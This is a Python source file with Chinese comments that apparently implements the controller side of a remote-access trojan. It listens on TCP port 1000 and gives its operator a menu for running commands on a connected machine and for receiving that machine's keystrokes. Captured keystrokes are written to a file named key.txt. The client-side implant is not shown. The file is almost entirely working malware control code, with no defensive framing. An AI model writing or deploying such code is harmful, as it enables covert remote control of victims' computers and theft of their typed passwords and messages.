import socket

host=''
port=1000
addr=(host,port)
link=socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM)#ipv4，tcp连接
link.bind(addr)
link.listen(10)#同时监听10个数据包
print('等待连接中.......')
linked,ADDR=link.accept()#等待连接
print(f"连接成功：{ADDR}")
print()
while True:
    data=input("请选择功能：输入1：命令执行  输入2：键盘监控   输入3 ：结束 ： ")
    linked.send(bytes(data,'utf-8'))#将选择转换为比特，发送到客户端
    message=linked.recv(1024).decode('utf-8')#将接收到的信息utf-8解码
    if data=='1':
        while True:
            linked.send(bytes(input("请输入指令："),'utf-8'))#将输入的指令信息转换为比特，发送至客户端
            result=linked.recv(4096).decode('utf-8')#接收客户端
            if result=='esc':#如果输入信息为esc，停止命令执行功能，重新选择功能
                print("命令执行功能关闭....")
                break
            print(f'运行结果为：{result}')#打印命令执行结结果
    elif data=='2':#开启键盘监控，使用的都是键盘监控项目的代码
        print("键盘监控中.......")
        fp=open('key.txt','w',encoding='utf-8')
        while True:
            data=linked.recv(1024).decode('utf-8')
            print(f'{data}:push')
            fp.write(data)
            if data=='Key.esc':
                fp.close()
                print("键盘监控结束，监控信息已经记入key.txt")
                break
    elif data=='3':#输入为3，断开连接
        link.close()
        break


